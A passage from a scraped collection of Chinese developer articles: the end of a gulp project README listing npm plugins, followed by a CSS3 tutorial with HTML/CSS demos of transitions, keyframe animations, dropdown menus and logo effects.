noreferrer\">gulp-uglify</a></li>\n</ul>\n<h4 class=\"heading\" data-id=\"heading-18\">图片压缩</h4>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp-imagemin\" rel=\"nofollow noopener noreferrer\">gulp-imagemin</a></li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fimagemin-pngquant\" rel=\"nofollow noopener noreferrer\">imagemin-pngquant</a></li>\n</ul>\n<h4 class=\"heading\" data-id=\"heading-19\">精灵图处理</h4>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp.spritesmith\" rel=\"nofollow noopener noreferrer\">gulp.spritesmith</a></li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fvinyl-buffer\" rel=\"nofollow noopener noreferrer\">vinyl-buffer</a></li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fmerge-stream\" rel=\"nofollow noopener noreferrer\">merge-stream</a></li>\n</ul>\n<h4 class=\"heading\" data-id=\"heading-20\">json 文件压缩</h4>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp-json-minify\" rel=\"nofollow noopener noreferrer\">gulp-json-minify</a></li>\n</ul>\n<h4 class=\"heading\" data-id=\"heading-21\">JavaScript, JSON, HTML 和 CSS 代码格式化</h4>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp-jsbeautifier\" rel=\"nofollow noopener noreferrer\">gulp-jsbeautifier</a></li>\n</ul>\n<h4 class=\"heading\" data-id=\"heading-22\">文件重命名</h4>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp-rename\" rel=\"nofollow noopener noreferrer\">gulp-rename</a></li>\n</ul>\n<h4 class=\"heading\" data-id=\"heading-23\">监听文件变化，显示 loading 效果</h4>\n<ul>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fgulp-watch\" rel=\"nofollow noopener noreferrer\">gulp-watch</a></li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fpath-exists\" rel=\"nofollow noopener noreferrer\">path-exists</a></li>\n</ul>\n<h2 class=\"heading\" data-id=\"heading-24\">协议</h2>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=LICENSE\" rel=\"nofollow noopener noreferrer\">GNU General Public License v3.0</a><br>\n本项目仅供学习交流和私人使用，禁止用作商业用途</p>\n</div>"},{"title":"个人总结（css3新特性）","avatar":"https://user-gold-cdn.xitu.io/2017/7/18/64d82b70650d11ed806f611d929c7b1e?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"守候i","create_time":"2017 年 12 月 04 日","tags":["CSS"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 data-id=\"heading-0\">1.前言</h2><p>css3这个相信大家不陌生了，是个非常有趣，神奇的东西！有了css3，js都可以少写很多！我之前也写过关于css3的文章，也封装过css3的一些小动画。个人觉得css3不难，但是很难用得好，用得顺手，最近我也在过一遍css3的一些新特性（不是全部，是我在工作上常用的，或者觉得有用的），以及一些实例，就写了这一篇总结！希望，这篇文章能帮到大家认识css3。写这篇文章主要是让大家能了解css3的一些新特性，以及基础的用法，感觉css3的魅力！如果想要用好css3，这个得靠大家继续努力学习，寻找一些讲得更深入的文章或者书籍了！如果大家有什么其他特性推荐的，欢迎补充！大家一起学习，进步！</p><blockquote><p>看这篇文章，代码可以不用看得过于仔细！这里主要是想让大家了解css3的新特性！代码也是很基础的用法。我给出代码主要是让大家在浏览器运行一下，让大家参考和调试。不要只看代码，只看代码的话，不会知道哪个代码有什么作用的，建议边看效果边看代码。</p></blockquote><h2 data-id=\"heading-1\">2.过渡</h2><p>过渡，是我在项目里面用得最多的一个特性了！也相信是很多人用得最多的一个例子！我平常使用就是想让一些交互效果（主要是hover动画），变得生动一些，不会显得那么生硬！好了，下面进入正文！</p><p>引用菜鸟教程的说法：CSS3 过渡是元素从一种样式逐渐改变为另一种的效果。要实现这一点，必须规定两项内容：指定要添加效果的CSS属性指定效果的持续时间。</p><h3 data-id=\"heading-2\">2-1语法</h3><pre class=\"hljs bash\"><code>transition： CSS属性，花费时间，效果曲线(默认ease)，延迟时间(默认0)</code></pre><p>栗子1</p><pre class=\"hljs bash\"><code>/*宽度从原始值到制定值的一个过渡，运动曲线ease,运动时间0.5秒，0.2秒后执行过渡*/\ntransition：width,.5s,ease,.2s</code></pre><p>栗子2</p><pre class=\"hljs bash\"><code>/*所有属性从原始值到制定值的一个过渡，运动曲线ease,运动时间0.5秒*/\ntransition：all,.5s\n</code></pre><p>上面栗子是简写模式，也可以分开写各个属性（这个在下面就不再重复了）</p><pre class=\"hljs bash\"><code>transition-property: width;\ntransition-duration: 1s;\ntransition-timing-function: linear;\ntransition-delay: 2s;\n</code></pre><h3 data-id=\"heading-3\">2-2实例-hover效果</h3><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf406a612547d?imageslim\" data-width=\"467\" data-height=\"139\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;467&quot; height=&quot;139&quot;&gt;&lt;/svg&gt;\"></p><p>上面两个按钮，第一个使用了过渡，第二个没有使用过渡，大家可以看到当中的区别，用了过渡之后是不是没有那么生硬，有一个变化的过程，显得比较生动。<br>当然这只是一个最简单的过渡栗子，两个按钮的样式代码，唯一的区别就是，第一个按钮加了过渡代码<code>transition: all .5s;</code></p><h3 data-id=\"heading-4\">2-3实例-下拉菜单</h3><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf406a38c5137?imageslim\" data-width=\"592\" data-height=\"570\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;592&quot; height=&quot;570&quot;&gt;&lt;/svg&gt;\"></p><p>上面两个菜单，第一个没有使用过渡，第二个使用过渡，大家明显看到区别，使用了过渡看起来也是比较舒服！代码区别就是有过渡的ul的上级元素(祖先元素)有一个类名（ul-transition）。利用这个类名，设置ul的过渡<code>.ul-transition ul{transform-origin: 0 0;transition: all .5s;}</code></p><p>可能大家不知道我在说什么！我贴下代码吧</p><p>html</p><pre class=\"hljs bash\"><code>&lt;div class=<span class=\"hljs-string\">\"demo-hover demo-ul t_c\"</span>&gt;\n    &lt;ul class=<span class=\"hljs-string\">\"fllil\"</span>&gt;\n        &lt;li&gt;\n            &lt;a href=<span class=\"hljs-string\">\"javascript:;\"</span>&gt;html&lt;/a&gt;\n            &lt;ul&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;div&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;h1&lt;/a&gt;&lt;/li&gt;\n            &lt;/ul&gt;\n        &lt;/li&gt;\n        &lt;li&gt;\n            &lt;a href=<span class=\"hljs-string\">\"javascript:;\"</span>&gt;js&lt;/a&gt;\n            &lt;ul&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;string&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;array&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;object&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;number&lt;/a&gt;&lt;/li&gt;\n            &lt;/ul&gt;\n        &lt;/li&gt;\n        &lt;li&gt;\n            &lt;a href=<span class=\"hljs-string\">\"javascript:;\"</span>&gt;css3&lt;/a&gt;\n            &lt;ul&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;transition&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;animation&lt;/a&gt;&lt;/li&gt;\n            &lt;/ul&gt;\n        &lt;/li&gt;\n        &lt;li&gt;\n            &lt;a href=<span class=\"hljs-string\">\"javascript:;\"</span>&gt;框架&lt;/a&gt;\n            &lt;ul&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;vue&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;react&lt;/a&gt;&lt;/li&gt;\n            &lt;/ul&gt;\n        &lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;div class=<span class=\"hljs-string\">\"clear\"</span>&gt;&lt;/div&gt;\n&lt;/div&gt;\n&lt;div class=<span class=\"hljs-string\">\"demo-hover demo-ul ul-transition t_c\"</span>&gt;\n    &lt;ul class=<span class=\"hljs-string\">\"fllil\"</span>&gt;\n        &lt;li&gt;\n            &lt;a href=<span class=\"hljs-string\">\"javascript:;\"</span>&gt;html&lt;/a&gt;\n            &lt;ul&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;div&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;h1&lt;/a&gt;&lt;/li&gt;\n            &lt;/ul&gt;\n        &lt;/li&gt;\n        &lt;li&gt;\n            &lt;a href=<span class=\"hljs-string\">\"javascript:;\"</span>&gt;js&lt;/a&gt;\n            &lt;ul&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;string&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;array&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;object&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;number&lt;/a&gt;&lt;/li&gt;\n            &lt;/ul&gt;\n        &lt;/li&gt;\n        &lt;li&gt;\n            &lt;a href=<span class=\"hljs-string\">\"javascript:;\"</span>&gt;css3&lt;/a&gt;\n            &lt;ul&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;transition&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;animation&lt;/a&gt;&lt;/li&gt;\n            &lt;/ul&gt;\n        &lt;/li&gt;\n        &lt;li&gt;\n            &lt;a href=<span class=\"hljs-string\">\"javascript:;\"</span>&gt;框架&lt;/a&gt;\n            &lt;ul&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;vue&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=<span class=\"hljs-string\">\"#\"</span>&gt;react&lt;/a&gt;&lt;/li&gt;\n            &lt;/ul&gt;\n        &lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;div class=<span class=\"hljs-string\">\"clear\"</span>&gt;&lt;/div&gt;\n&lt;/div&gt;\n</code></pre><p>css</p><pre class=\"hljs bash\"><code>.demo-ul{margin-bottom: 300px;}\n    .demo-ul li{\n        padding: 0 10px;\n        width: 100px;\n        background: <span class=\"hljs-comment\">#f90;</span>\n        position: relative;\n    }\n    .demo-ul li a{\n        display: block;\n        height: 40px;\n        line-height: 40px;\n        text-align: center;\n    }\n    .demo-ul li ul{\n        position: absolute;\n        width: 100%;\n        top: 40px;\n        left: 0;\n        transform: scaleY(0);\n        overflow: hidden;\n    }\n    .ul-transition ul{\n        transform-origin: 0 0;\n        transition: all .5s;\n    }\n    .demo-ul li:hover ul{\n        transform: scaleY(1);\n    }\n    .demo-ul li ul li{\n        <span class=\"hljs-built_in\">float</span>: none;\n        background: <span class=\"hljs-comment\">#0099ff;</span>\n\n}\n</code></pre><p>上面两个可以说是过渡很基础的用法，过渡用法灵活，功能也强大，结合js，可以很轻松实现各种效果（焦点图，手风琴）等，以及很多意想不到的效果。这个靠大家要去挖掘！</p><h2 data-id=\"heading-5\">3.动画</h2><p>动画这个平常用的也很多，主要是做一个预设的动画。和一些页面交互的动画效果，结果和过渡应该一样，让页面不会那么生硬！</p><h3 data-id=\"heading-6\">3-1.语法</h3><pre class=\"hljs bash\"><code>animation：动画名称，一个周期花费时间，运动曲线（默认ease），动画延迟（默认0），播放次数（默认1），是否反向播放动画（默认normal），是否暂停动画（默认running）</code></pre><p>栗子1</p><pre class=\"hljs bash\"><code>/*执行一次logo2-line动画，运动时间2秒，运动曲线为 linear*/\nanimation: logo2-line 2s linear;</code></pre><p>栗子2</p><pre class=\"hljs bash\"><code>/*2秒后开始执行一次logo2-line动画，运动时间2秒，运动曲线为 linear*/\nanimation: logo2-line 2s linear 2s;</code></pre><p>栗子3</p><pre class=\"hljs bash\"><code>/*无限执行logo2-line动画，每次运动时间2秒，运动曲线为 linear，并且执行反向动画*/\nanimation: logo2-line 2s linear alternate infinite;</code></pre><p>还有一个重要属性</p><pre class=\"hljs bash\"><code>animation-fill-mode : none | forwards | backwards | both;\n/*none：不改变默认行为。    \nforwards ：当动画完成后，保持最后一个属性值（在最后一个关键帧中定义）。    \nbackwards：在 animation-delay 所指定的一段时间内，在动画显示之前，应用开始属性值（在第一个关键帧中定义）。 \nboth：向前和向后填充模式都被应用。  */      </code></pre><h3 data-id=\"heading-7\">3-2.logo展示动画</h3><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf406b0855a99?imageslim\" data-width=\"776\" data-height=\"220\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;776&quot; height=&quot;220&quot;&gt;&lt;/svg&gt;\"></p><p>这个是我用公司logo写的动画，没那么精细</p><p>代码如下</p><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\n&lt;head&gt;\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n    &lt;link rel=<span class=\"hljs-string\">\"stylesheet\"</span> href=<span class=\"hljs-string\">\"reset.css\"</span>&gt;\n&lt;/head&gt;\n&lt;style&gt;\n.logo-box{\n    width: 600px;\n    margin: 100px auto;\n    font-size: 0;\n    position: relative;\n}\n.logo-box div{\n    display: inline-block;\n}\n.logo-box .logo-text{\n    margin-left: 10px;\n}\n.logo-box .logo1{\n    animation: logo1 1s ease-in 2s;\n    animation-fill-mode:backwards;\n}\n.logo-box .logo-text{\n    animation: logoText 1s ease-in 3s;\n    animation-fill-mode:backwards;\n}\n.logo-box .logo2{\n    position: absolute;\n    top: 20px;\n    left: 20px;\n    animation: logo2-middle 2s ease-in;\n}\n.logo-box .logo2 img{\n    animation: logo2-line 2s linear;\n}\n@keyframes logo1 {\n    0%{\n        transform:rotate(180deg);\n        opacity: 0;\n    }\n    100%{\n        transform:rotate(0deg);\n        opacity: 1;\n    }\n}\n@keyframes logoText {\n    0%{\n        transform:translateX(30px);\n        opacity: 0;\n    }\n    100%{\n        transform:translateX(0);\n        opacity: 1;\n    }\n}\n@keyframes logo2-line {\n    0% { transform: translateX(200px)}\n    25% { transform: translateX(150px)}\n    50% { transform: translateX(100px)}\n    75% { transform: translateX(50px)}\n    100% { transform: translateX(0); }\n}\n\n@keyframes logo2-middle {\n    0% { transform: translateY(0);     }\n    25% { transform: translateY(-100px);     }\n    50% { transform: translateY(0);     }\n    75% { transform: translateY(-50px);     }\n    100% { transform: translateY(0); }\n}\n&lt;/style&gt;\n&lt;body&gt;\n&lt;div class=<span class=\"hljs-string\">\"logo-box\"</span>&gt;\n&lt;div class=<span class=\"hljs-string\">\"logo1\"</span>&gt;&lt;img src=<span class=\"hljs-string\">\"logo1.jpg\"</span>/&gt;&lt;/div&gt;\n&lt;div class=<span class=\"hljs-string\">\"logo2\"</span>&gt;&lt;img src=<span class=\"hljs-string\">\"logo2.jpg\"</span>/&gt;&lt;/div&gt;\n&lt;div class=<span class=\"hljs-string\">\"logo-text\"</span>&gt;&lt;img src=<span class=\"hljs-string\">\"logo3.jpg\"</span>/&gt;&lt;/div&gt;\n&lt;/div&gt;\n\n&lt;div class=<span class=\"hljs-string\">\"wraper\"</span>&gt;&lt;div class=<span class=\"hljs-string\">\"item\"</span>&gt;&lt;/div&gt;&lt;/div&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>下面让大家看一个专业级别的</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf406a3af6c0a?imageslim\" data-width=\"734\" data-height=\"214\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;734&quot; height=&quot;214&quot;&gt;&lt;/svg&gt;\"></p><p>代码如下</p><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\n&lt;head&gt;\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\n    &lt;title&gt;Title&lt;/title&gt;\n&lt;/head&gt;\n&lt;style&gt;\n    body {\n        font-family: Arial,<span class=\"hljs-string\">\"Helvetica Neue\"</span>,Helvetica,sans-serif;\n        overflow: hidden;\n        background: <span class=\"hljs-comment\">#fff;</span>\n    }\n\n    .center {\n        margin: 80px auto;\n    }\n\n    .so {\n        display: block;\n        width: 500px;\n        height: 156px;\n        background: <span class=\"hljs-comment\">#ffffff;</span>\n    }\n    .so .inner {\n        width: 500px;\n        height: 156px;\n        position: absolute;\n    }\n    .so .inner * {\n        position: absolute;\n        animation-iteration-count: infinite;\n        animation-duration: 3.5s;\n    }\n    .so .inner .name {\n        position: absolute;\n        font-size: 54px;\n        left: 130px;\n        top: 95px;\n    }\n    .so .inner .name .b {\n        font-weight: bold;\n    }\n    .so .inner .stack-box {\n        top: 100px;\n        width: 115px;\n        height: 56px;\n    }\n    .so .inner .box {\n        width: 115px;\n        height: 56px;\n        left: 0px;\n    }\n    .so .inner .box div {\n        background: <span class=\"hljs-comment\">#BCBBBB;</span>\n    }\n    .so .inner .box .bottom {\n        bottom: 0px;\n        left: 0px;\n        width: 115px;\n        height: 12px;\n    }\n    .so .inner .box .left {\n        bottom: 11px;\n        left: 0px;\n        width: 12px;\n        height: 34px;\n    }\n    .so .inner .box .right {\n        bottom: 11px;\n        left: 103px;\n        width: 12px;\n        height: 34px;\n    }\n    .so .inner .box .top {\n        top: 0px;\n        left: 0px;\n        width: 0;\n        height: 12px;\n    }\n    .so .inner .stack {\n        left: 22px;\n        top: 22px;\n    }\n    .so .inner .stack .inner-item {\n        background: <span class=\"hljs-comment\">#F48024;</span>\n        width: 71px;\n        height: 12px;\n    }\n    .so .inner .stack .item {\n        transition: transform 0.3s;\n        width: 291px;\n    }\n    .so .inner .stack div:nth-child(1) {\n        transform: rotate(0deg);\n    }\n    .so .inner .stack div:nth-child(2) {\n        transform: rotate(12deg);\n    }\n    .so .inner .stack div:nth-child(3) {\n        transform: rotate(24deg);\n    }\n    .so .inner .stack div:nth-child(4) {\n        transform: rotate(36deg);\n    }\n    .so .inner .stack div:nth-child(5) {\n        transform: rotate(48deg);\n    }\n    .so .inner .box {\n        animation-name: box;\n    }\n    .so .inner .box .top {\n        animation-name: box-top;\n    }\n    .so .inner .box .left {\n        animation-name: box-left;\n    }\n    .so .inner .box .right {\n        animation-name: box-right;\n    }\n    .so .inner .box .bottom {\n        animation-name: box-bottom;\n    }\n    .so .inner .stack-box {\n        animation-name: stack-box;\n    }\n    .so .inner .stack {\n        animation-name: stack;\n    }\n    .so .inner .stack .inner-item {\n        animation-name: stack-items;\n    }\n    .so .inner .stack .item:nth-child(1) {\n        animation-name: stack-item-1;\n    }\n    .so .inner .stack .item:nth-child(2) {\n        animation-name: stack-item-2;\n    }\n    .so .inner .stack .item:nth-child(3) {\n        animation-name: stack-item-3;\n    }\n    .so .inner .stack .item:nth-child(4) {\n        animation-name: stack-item-4;\n    }\n    .so .inner .stack .item:nth-child(5) {\n        animation-name: stack-item-5;\n    }\n    @keyframes stack {\n        0% {\n            left: 22px;\n        }\n        15% {\n            left: 22px;\n        }\n        30% {\n            left: 52px;\n        }\n        50% {\n            left: 52px;\n        }\n        80% {\n            left: 22px;\n        }\n    }\n    @keyframes stack-item-1 {\n        0% {\n            transform: rotate(12deg * 0);\n        }\n        10% {\n            transform: rotate(0deg);\n        }\n        50% {\n            transform: rotate(0deg);\n        }\n        54% {\n            transform: rotate(0deg);\n        }\n        92% {\n            transform: rotate(12deg * 0);\n        }\n    }\n    @keyframes stack-item-2 {\n        0% {\n            transform: rotate(12deg * 1);\n        }\n        10% {\n            transform: rotate(0deg);\n        }\n        50% {\n            transform: rotate(0deg);\n        }\n        54% {\n            transform: rotate(0deg);\n        }\n        92% {\n            transform: rotate(12deg * 1);\n        }\n    }\n    @keyframes stack-item-3 {\n        0% {\n            transform: rotate(12deg * 2);\n        }\n        10% {\n            transform: rotate(0deg);\n        }\n        50% {\n            transform: rotate(0deg);\n        }\n        54% {\n            transform: rotate(0deg);\n        }\n        92% {\n            transform: rotate(12deg * 2);\n        }\n    }\n    @keyframes stack-item-4 {\n        0% {\n            transform: rotate(12deg * 3);\n        }\n        10% {\n            transform: rotate(0deg);\n        }\n        50% {\n            transform: rotate(0deg);\n        }\n        54% {\n            transform: rotate(0deg);\n        }\n        92% {\n            transform: rotate(12deg * 3);\n        }\n    }\n    @keyframes stack-item-5 {\n        0% {\n            transform: rotate(12deg * 4);\n        }\n        10% {\n            transform: rotate(0deg);\n        }\n        50% {\n            transform: rotate(0deg);\n        }\n        54% {\n            transform: rotate(0deg);\n        }\n        92% {\n            transform: rotate(12deg * 4);\n        }\n    }\n    @keyframes stack-items {\n        0% {\n            width: 71px;\n        }\n        15% {\n            width: 71px;\n        }\n        30% {\n            width: 12px;\n        }\n        50% {\n            width: 12px;\n        }\n        80% {\n            width: 71px;\n        }\n    }\n    @keyframes box {\n        0% {\n            left: 0;\n        }\n        15% {\n            left: 0;\n        }\n        30% {\n            left: 30px;\n        }\n        50% {\n            left: 30px;\n        }\n        80% {\n            left: 0;\n        }\n    }\n    @keyframes box-top {\n        0% {\n            width: 0;\n        }\n        6% {\n            width: 0;\n        }\n        15% {\n            width: 115px;\n        }\n        30% {\n            width: 56px;\n        }\n        50% {\n            width: 56px;\n        }\n        59% {\n            width: 0;\n        }\n    }\n    @keyframes box-bottom {\n        0% {\n            width: 115px;\n        }\n        15% {\n            width: 115px;\n        }\n        30% {\n            width: 56px;\n        }\n        50% {\n            width: 56px;\n        }\n        80% {\n            width: 115px;\n        }\n    }\n    @keyframes box-right {\n        15% {\n            left: 103px;\n        }\n        30% {\n            left: 44px;\n        }\n        50% {\n            left: 44px;\n        }\n        80% {\n            left: 103px;\n        }\n    }\n    @keyframes stack-box {\n        0% {\n            transform: rotate(0deg);\n        }\n        30% {\n            transform: rotate(0deg);\n        }\n        40% {\n            transform: rotate(135deg);\n        }\n        50% {\n            transform: rotate(135deg);\n        }\n        83% {\n            transform: rotate(360deg);\n        }\n        100% {\n            transform: rotate(360deg);\n        }\n    }\n&lt;/style&gt;\n&lt;body&gt;\n&lt;div class=<span class=\"hljs-string\">\"so center\"</span>&gt;\n    &lt;div class=<span class=\"hljs-string\">\"inner\"</span>&gt;\n        &lt;div class=<span class=\"hljs-string\">\"stack-box\"</span>&gt;\n            &lt;div class=<span class=\"hljs-string\">\"stack\"</span>&gt;\n                &lt;div class=<span class=\"hljs-string\">\"item\"</span>&gt;\n                    &lt;div class=<span class=\"hljs-string\">\"inner-item\"</span>&gt;&lt;/div&gt;\n                &lt;/div&gt;\n                &lt;div class=<span class=\"hljs-string\">\"item\"</span>&gt;\n                    &lt;div class=<span class=\"hljs-string\">\"inner-item\"</span>&gt;&lt;/div&gt;\n                &lt;/div&gt;\n                &lt;div class=<span class=\"hljs-string\">\"item\"</span>&gt;\n                    &lt;div class=<span class=\"hljs-string\">\"inner-item\"</span>&gt;&lt;/div&gt;\n                &lt;/div&gt;\n                &lt;div class=<span class=\"hljs-string\">\"item\"</span>&gt;\n                    &lt;div class=<span class=\"hljs-string\">\"inner-item\"</span>&gt;&lt;/div&gt;\n                &lt;/div&gt;\n                &lt;div class=<span class=\"hljs-string\">\"item\"</span>&gt;\n                    &lt;div class=<span class=\"hljs-string\">\"inner-item\"</span>&gt;&lt;/div&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n            &lt;div class=<span class=\"hljs-string\">\"box\"</span>&gt;\n                &lt;div class=<span class=\"hljs-string\">\"bottom\"</span>&gt;&lt;/div&gt;\n                &lt;div class=<span class=\"hljs-string\">\"left\"</span>&gt;&lt;/div&gt;\n                &lt;div class=<span class=\"hljs-string\">\"right\"</span>&gt;&lt;/div&gt;\n                &lt;div class=<span class=\"hljs-string\">\"top\"</span>&gt;&lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n        &lt;div class=<span class=\"hljs-string\">\"name\"</span>&gt;\n            stack&lt;span class=<span class=\"hljs-string\">\"b\"</span>&gt;overflow&lt;/span&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><h3 data-id=\"heading-8\">3-3.loading效果</h3><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf406c9b4b6be?imageslim\" data-width=\"800\" data-height=\"638\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;638&quot;&gt;&lt;/svg&gt;\"></p><p>这个代码实在太多了，大家直接上网址看吧。<a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.html5tricks.com%2Fdemo%2Fcss3-loading-cool-styles%2Findex.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">css3-loading</a></p><h3 data-id=\"heading-9\">3-4.音乐震动条</h3><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf406a65019bf?imageslim\" data-width=\"260\" data-height=\"155\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;260&quot; height=&quot;155&quot;&gt;&lt;/svg&gt;\"></p><p>代码如下</p><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\n&lt;head&gt;\n  &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\n  &lt;title&gt;纯CSS3模拟跳动的音符效果&lt;/title&gt;\n  &lt;style&gt;\n    *{margin:0;padding:0;list-style: none;}\n    body{background-color: <span class=\"hljs-comment\">#efefef;}</span>\n    .demo-music {\n      position: absolute;\n      width: 100%;\n      height: 200px;\n      top: 120px;\n      zoom: 1.5;\n    }\n\n    .demo-music .music {\n      width: 80px;\n      height: 50px;\n      top: 50%;\n      left: 50%;\n      -webkit-transform: translate(-40px, -25px);\n      transform: translate(-40px, -25px);\n      position: absolute;\n    }\n\n    .demo-music <span class=\"hljs-comment\">#waves {</span>\n      width: 80px;\n      height: 50px;\n      position: absolute;\n      top: 12px;\n      left: 12px;\n    }\n\n    .demo-music <span class=\"hljs-comment\">#waves li {</span>\n      position: relative;\n      <span class=\"hljs-built_in\">float</span>: left;\n      height: 100%;\n      width: 12%;\n      overflow: hidden;\n      margin-right: 1px;\n    }\n\n    .demo-music <span class=\"hljs-comment\">#waves li span {</span>\n      position: absolute;\n      bottom: 0;\n      display: block;\n      height: 100%;\n      width: 100px;\n      background: <span class=\"hljs-comment\">#09f;</span>\n    }\n\n    .demo-music <span class=\"hljs-comment\">#waves .li1 span {</span>\n      animation: waves 0.8s linear 0s infinite alternate;\n      -webkit-animation: waves 0.8s linear 0s infinite alternate;\n    }\n\n    .demo-music <span class=\"hljs-comment\">#waves .li2 span {</span>\n      animation: waves 0.9s linear 0s infinite alternate;\n      -webkit-animation: waves 0.9s linear 0s infinite alternate;\n    }\n\n    .demo-music <span class=\"hljs-comment\">#waves .li3 span {</span>\n      animation: waves 1s linear 0s infinite alternate;\n      -webkit-animation: waves 1s linear 0s infinite alternate;\n    }\n\n    .demo-music <span class=\"hljs-comment\">#waves .li4 span {</span>\n      animation: waves 0.8s linear 0s infinite alternate;\n      -webkit-animation: waves 0.8s linear 0s infinite alternate;\n    }\n\n    .demo-music <span 